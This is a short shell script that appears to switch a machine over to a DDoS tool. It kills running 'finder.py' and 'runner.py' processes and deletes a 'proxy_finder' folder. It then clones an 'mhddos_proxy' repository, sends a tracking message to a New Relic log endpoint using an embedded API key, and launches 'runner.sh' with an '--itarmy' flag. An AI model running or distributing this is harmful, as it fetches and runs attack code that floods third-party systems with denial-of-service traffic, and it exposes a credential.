set -e
pkill -f finder.py || true
pkill -f runner.py || true
cd ~
rm -rf proxy_finder
git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git || true
cd mhddos_proxy
python3.10 -c "import requests; requests.post('https://log-api.eu.newrelic.com/log/v1?Api-Key=eu01xx60b22b235f529f8300080bf55aFFFFNRAL', json={'message': 'mac_finder_to_mhddos'}, timeout=10)"
bash ./runner.sh python3.10 --itarmy
